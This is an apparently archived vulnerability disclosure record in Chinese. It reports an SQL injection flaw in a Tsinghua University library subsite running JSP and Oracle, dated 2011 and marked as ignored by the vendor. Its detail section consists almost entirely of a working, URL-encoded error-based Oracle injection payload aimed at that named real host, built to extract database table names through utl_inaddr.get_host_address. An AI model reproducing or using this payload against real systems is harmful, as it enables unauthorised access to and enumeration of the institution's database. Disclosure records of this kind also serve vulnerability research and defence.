wybug_title: 清华大学分站注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2011-04-25：	积极联系厂商并且等待厂商认领中，细节不对外公开									2011-04-25：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： JSP+ORACLE 详细说明：  http://www.lib.tsinghua.edu.cn/homepage/announce_view.jsp?id=2217%27+or+1%3Dutl_inaddr.get_host_address%28%28%28select+distinct+chr%28126%29%7C%7Cchr%2839%29%7C%7Ccast%28table_name+as+char%2850%29%29%7C%7Cchr%2839%29%7C%7Cchr%28126%29+from+%28select+distinct+rownum+r%2Ctable_name+from+all_tables+where+owner<>chr%2883%29%7C%7Cchr%2889%29%7C%7Cchr%2883%29+and+owner+<>chr%2883%29%7C%7Cchr%2889%29%7C%7Cchr%2883%29%7C%7Cchr%2884%29%7C%7Cchr%2869%29%7C%7Cchr%2877%29+and+owner<>chr%2867%29%7C%7Cchr%2884%29%7C%7Cchr%2888%29%7C%7Cchr%2883%29%7C%7Cchr%2889%29%7C%7Cchr%2883%29+and+owner<>chr%2887%29%7C%7Cchr%2877%29%7C%7Cchr%2883%29%7C%7Cchr%2889%29%7C%7Cchr%2883%29+and+owner<>chr%2877%29%7C%7Cchr%2868%29%7C%7Cchr%2883%29%7C%7Cchr%2889%29%7C%7Cchr%2883%29+and+owner<>chr%2879%29%7C%7Cchr%2876%29%7C%7Cchr%2865%29%7C%7Cchr%2880%29%7C%7Cchr%2883%29%7C%7Cchr%2889%29%7C%7Cchr%2883%29%29where+r%3D21%29%29%29+and+%271%27%3D%271   漏洞证明：
